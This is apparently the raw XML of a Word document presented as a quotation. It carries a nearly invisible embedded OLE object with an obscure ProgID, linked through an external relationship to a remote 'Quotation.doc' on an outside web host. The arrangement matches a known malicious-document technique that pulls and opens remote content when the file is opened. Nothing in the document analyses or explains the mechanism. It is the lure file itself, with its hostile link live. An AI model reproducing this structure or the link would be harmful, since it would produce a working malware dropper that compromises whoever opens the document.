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E" w:rsidRPr="0094487F" w:rsidRDefault="0094487F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object w:dxaOrig="32517" w:dyaOrig="15942">
          <v:shape id="_id_1917" style="width:14.6pt;height:12.8pt" o:ole=""/>
          <o:OLEObject Type="Link" ProgID="9OwunjNUf" r:id="_id_2302" ShapeID="_id_1917">
            <o:LinkType>EnhancedMetaFile</o:LinkType>
            <o:LockedField>false</o:LockedField>
            <o:FieldCodes>\f 0</o:FieldCodes>
          </o:OLEObject>
        </w:object>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00143E0E" w:rsidRPr="00944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36"/>
    <w:rsid w:val="00143E0E"/>
    <w:rsid w:val="00185BB5"/>
    <w:rsid w:val="0094487F"/>
    <w:rsid w:val="00A1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_id_2302" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" TargetMode="External" Target="http://abatii.web.id/ojay/Panel/Quotation.doc"/>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dotm.dotm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2017-09-24T17:26:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2017-09-24T17:27:00Z</dcterms:modified>
</cp:coreProperties>
</file>